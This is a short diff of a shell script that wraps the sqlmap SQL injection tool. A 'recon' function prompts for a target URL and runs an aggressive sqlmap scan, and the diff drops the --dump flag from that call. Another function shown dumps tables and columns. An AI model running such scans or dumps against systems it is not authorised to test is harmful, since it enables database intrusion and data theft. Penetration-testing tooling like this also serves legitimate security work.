@@ -30,7 +30,7 @@ sqlmap -u $url --random-agent -D $db -T $tables --columns --dump --threads 7    
 
 function recon(){
 read -p " what is the url of target?:" target
-sqlmap -u $target --random-agent --level=3 --risk=2 -o -b --is-dba --all --fingerprint --dbs --tables --count --dump --threads 7
+sqlmap -u $target --random-agent --level=3 --risk=2 -o -b --is-dba --all --fingerprint --dbs --tables --count --threads 7
 
 }
 
